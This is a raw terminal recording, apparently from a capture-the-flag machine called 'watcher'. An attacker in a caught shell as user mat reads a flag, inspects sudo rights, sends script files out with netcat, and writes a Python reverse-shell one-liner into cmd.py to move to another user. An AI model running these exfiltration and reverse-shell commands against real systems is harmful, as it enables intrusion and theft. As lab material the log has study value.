@@ -1,0 +1,110 @@
+Script started on 2025-04-09 12:40:10+03:00 [COMMAND="rlwrap nc -lnvp 4444" TERM="xterm-256color" TTY="/dev/pts/2" COLUMNS="104" LINES="27"]
+[?2004hlistening on [any] 4444 ...
+[Kconnect to [172.31.95.146] from (UNKNOWN) [172.31.80.1] 6719
+[Kmat@watcher:~$ [Kmat@watcher:~$ [K[?2004hmat@watcher:~$ ls[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hls
+[Kls
+[Kcow.jpg  flag_5.txt  note.txt  scripts
+mat@watcher:~$ [Kmat@watcher:~$ [K[?2004hmat@watcher:~$ cat flag_5.txt[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hcat flag_5.txt
+[Kcat flag_5.txt
+[KFLAG{live_by_the_cow_die_by_the_cow}
+mat@watcher:~$ [Kmat@watcher:~$ [K[?2004hmat@watcher:~$ sudo -l[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hsudo -l
+[Ksudo -l
+[KMatching Defaults entries for mat on watcher:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User mat may run the following commands on watcher:
+    (will) NOPASSWD: /usr/bin/python3 /home/mat/scripts/will_script.py *
+mat@watcher:~$ [Kmat@watcher:~$ [K[?2004hmat@watcher:~$ s[Kls -al[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hls -al
+[Kls -al[Kls -al[Kls -al
+total 312
+drwxr-xr-x 6 mat  mat    4096 Dec  3  2020 .
+drwxr-xr-x 6 root root   4096 Dec  3  2020 ..
+lrwxrwxrwx 1 root root      9 Dec  3  2020 .bash_history -> /dev/null
+-rw-r--r-- 1 mat  mat     220 Dec  3  2020 .bash_logout
+-rw-r--r-- 1 mat  mat    3771 Dec  3  2020 .bashrc
+drwx------ 2 mat  mat    4096 Dec  3  2020 .cache
+-rw-r--r-- 1 mat  mat  270433 Dec  3  2020 cow.jpg
+-rw------- 1 mat  mat      37 Dec  3  2020 flag_5.txt
+drwx------ 3 mat  mat    4096 Dec  3  2020 .gnupg
+drwxrwxr-x 3 mat  mat    4096 Dec  3  2020 .local
+-rw-r--r-- 1 will will    141 Dec  3  2020 note.txt
+-rw-r--r-- 1 mat  mat     807 Dec  3  2020 .profile
+drwxrwxr-x 2 will will   4096 Dec  3  2020 scripts
+mat@watcher:~$ [Kmat@watcher:~$ [K[?2004hmat@watcher:~$ cat note.txt[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hcat note.txt
+[Kcat note.txt
+Hi Mat,
+
+I've set up your sudo rights to use the python script as my user. You can only run the script with sudo so it should be safe.
+
+Will
+mat@watcher:~$ [Kmat@watcher:~$ [K[?2004hmat@watcher:~$ cd scripts[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hcd scripts
+[Kcd scripts
+mat@watcher:~/scripts$ [Kmat@watcher:~/scripts$ [K[?2004hmat@watcher:~/scripts$ ls[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hls
+[Kls[Kls[Kls
+cmd.py  will_script.py
+mat@watcher:~/scripts$ [Kmat@watcher:~/scripts$ [K[K[?2004hmat@watcher:~/scripts$ [Kmat@watcher:~/scripts$ [Kmat@watcher:~/scripts$ [Kmat@watcher:~/scripts$ [Kmat@watcher:~/scripts$ dd if=[7mwill_script.py[27mwill_script.py status=progress | nc 10.8.61.245 6047[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hdd if=will_script.py status=progress | nc 10.8.61.245 6047
+[K<ill_script.py status=progress | nc 10.8.61.245 6047[K<ill_script.py status=progress | nc 10.8.61.245 6047[K<ill_script.py status=progress | nc 10.8.61.245 6047
+0+1 records in
+0+1 records out
+208 bytes copied, 0.00167803 s, 124 kB/s
+[Kmat@watcher:~/scripts$ [Kmat@watcher:~/scripts$ [K[?2004hmat@watcher:~/scripts$ dd if=will_script.py status=progress | nc 10.8.61.245 6047[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[1P[1P[1P[1P[1P[1P[1P[1P[1P[1P[1P[1P[1P[1P[6@[7mcmd.py[27m[7mdd if=[27mcmd.py[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hdd if=cmd.py status=progress | nc 10.8.61.245 6047
+[Kdd if=cmd.py status=progress | nc 10.8.61.245 6047[Kdd if=cmd.py status=progress | nc 10.8.61.245 6047[Kdd if=cmd.py status=progress | nc 10.8.61.245 6047
+0+1 records in
+0+1 records out
+133 bytes copied, 0.000701999 s, 189 kB/s
+[Kmat@watcher:~/scripts$ [Kmat@watcher:~/scripts$ [K[?2004hmat@watcher:~/scripts$ echo '[7mimport socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STRE[27m[7mA[27m[7mM);s.connect(("10.8.61.245",6047));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);[27m[7mp[27m[7m=subprocess.call(["/bin/sh","-i"]);[27m[A[Aimport socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.8.61.245",6047));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' | sudo -u [K[K[Ktee [7m/home/mat/scripts/[27m/home/mat/scripts/cmd.py[A[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K
+[K
+[K[A[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[?2004hecho 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.8.61.245",6047));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' | sudo tee /home/mat/scripts/cmd.py
+[K<in/sh","-i"]);' | sudo tee /home/mat/scripts/cmd.py[K<in/sh","-i"]);' | sudo tee /home/mat/scripts/cmd.py[K<in/sh","-i"]);' | sudo tee /home/mat/scripts/cmd.py
+[sudo] password for mat: [K[sudo] password for mat: [K[?2004h[sudo] password for mat: [?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[?2004h
+[K
+[KSorry, try again.[KSorry, try again.[KSorry, try again.
+[sudo] password for mat: [K[sudo] password for mat: [K[?2004h[sudo] password for mat: [?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[?2004h
+[K
+[KSorry, try again.[KSorry, try again.[KSorry, try again.
+[sudo] password for mat: [K[sudo] password for mat: [K[?2004h[sudo] password for mat: [?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[?2004h
+[K
+[Ksudo[Ksudo[Ksudo: 3 incorrect password attempts
+mat@watcher:~/scripts$ [Kmat@watcher:~/scripts$ [K[?2004hmat@watcher:~/scripts$ echo 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.8.61.245",6047));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' | sudo tee /home/mat/scripts/cmd.py[1@-[1@u[1@ [1@w[1@i[1@l[1@l[1@ [C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[A[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K
+[K
+[K[A[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[?2004hecho 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.8.61.245",6047));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' | sudo -u will tee /home/mat/scripts/cmd.py
+[K<-i"]);' | sudo -u will tee /home/mat/scripts/cmd.py[K<-i"]);' | sudo -u will tee /home/mat/scripts/cmd.py[K<-i"]);' | sudo -u will tee /home/mat/scripts/cmd.py
+[sudo] password for mat: [K[sudo] password for mat: [K[?2004h[sudo] password for mat: [?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[?2004h
+[K
+[KSorry, try again.[KSorry, try again.[KSorry, try again.
+[sudo] password for mat: [K[sudo] password for mat: [K[?2004h[sudo] password for mat: [?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[?2004h
+[K
+[KSorry, try again.[KSorry, try again.[KSorry, try again.
+[sudo] password for mat: [K[sudo] password for mat: [K[?2004h[sudo] password for mat: [?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[?2004h
+[K
+[Ksudo[Ksudo[Ksudo: 3 incorrect password attempts
+mat@watcher:~/scripts$ [Kmat@watcher:~/scripts$ [K[?2004hmat@watcher:~/scripts$ ls[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hls
+[Kls
+[Kcmd.py  will_script.py
+mat@watcher:~/scripts$ [Kmat@watcher:~/scripts$ [K[?2004hmat@watcher:~/scripts$ cd [K[K[Klsecho 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.8.61.245",6047));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' | sudo -u will tee /home/mat/scripts/cmd.py[C[C[C[C[1Pcmd.py[1Pcmd.py[1Pcmd.py[1Pcmd.py[1Pcmd.py[1Pcmd.py[1Pmd.py[1Pcmd.py[1Pcmd.py[1Pcmd.py[1Pcmd.py[1Pcmd.py[1Pcmd.py[1Pcmd.py[1Pcmd.py[1Pcmd.py[1Pcmd.py[1Pcmd.py[1Pcmd.py[1Pcmd.py[1Pcmd.py[1Pcmd.py[1Pcmd.py[1Pcmd.py[1Pcmd.py[1Pcmd.py[1Pcmd.py[1Pcmd.py[1Pcmd.py[1Pcmd.py[1Pcmd.py[1Pcmd.py[1Pcmd.py[1Pcmd.py[1Pcmd.pytcmd.pyecmd.pyecmd.py cmd.py[A[A[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K
+[K
+[K[A[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[?2004hecho 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.8.61.245",6047));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' | tee cmd.py
+[K<;p=subprocess.call(["/bin/sh","-i"]);' | tee cmd.py[K<;p=subprocess.call(["/bin/sh","-i"]);' | tee cmd.py[K<;p=subprocess.call(["/bin/sh","-i"]);' | tee cmd.py
+import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.8.61.245",6047));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
+mat@watcher:~/scripts$ [Kmat@watcher:~/scripts$ [K[?2004hmat@watcher:~/scripts$ echo 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.8.61.245",6047));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' | tee cmd.py[A[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Cls[K
+[K
+[K[A[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[Ks[Kls[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hls
+[Kls[Kls[Kls
+cmd.py  will_script.py
+mat@watcher:~/scripts$ [Kmat@watcher:~/scripts$ [K[?2004hmat@watcher:~/scripts$ cat cmd.py[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hcat cmd.py
+[Kcat cmd.py[Kcat cmd.py[Kcat cmd.py
+import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.8.61.245",6047));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
+mat@watcher:~/scripts$ [Kmat@watcher:~/scripts$ [K[?2004hmat@watcher:~/scripts$ sudo -u will [7m/usr/bin/python3 /home/mat/scripts/will_script.py[27m[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C/usr/bin/python3 /home/mat/scripts/will_script.py cmd.py[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hsudo -u will /usr/bin/python3 /home/mat/scripts/will_script.py cmd.py
+[K<bin/python3 /home/mat/scripts/will_script.py cmd.py[K<bin/python3 /home/mat/scripts/will_script.py cmd.py[K<bin/python3 /home/mat/scripts/will_script.py cmd.py
+[K[sudo] password for will: [K[sudo] password for will: [K[?2004h[sudo] password for will: [?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[?2004h
+[K
+[K[sudo] password for will: [K[sudo] password for will: [K[?2004h[sudo] password for will: [?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[?2004h
+[K
+[K[sudo] password for will: [K[sudo] password for will: [K[?2004h[sudo] password for will: [?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[?2004h
+[K
+[Kmat@watcher:~/scripts$ [Kmat@watcher:~/scripts$ [K[?2004hmat@watcher:~/scripts$ sudo -u will /usr/bin/python3 /home/mat/scripts/will_script.py cmd.py[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hsudo -u will /usr/bin/python3 /home/mat/scripts/will_script.py cmd.py
+[K<bin/python3 /home/mat/scripts/will_script.py cmd.py[K<bin/python3 /home/mat/scripts/will_script.py cmd.py[K<bin/python3 /home/mat/scripts/will_script.py cmd.py
+[K
+[?2004l
+Script done on 2025-04-09 13:12:13+03:00 [COMMAND_EXIT_CODE="1"]
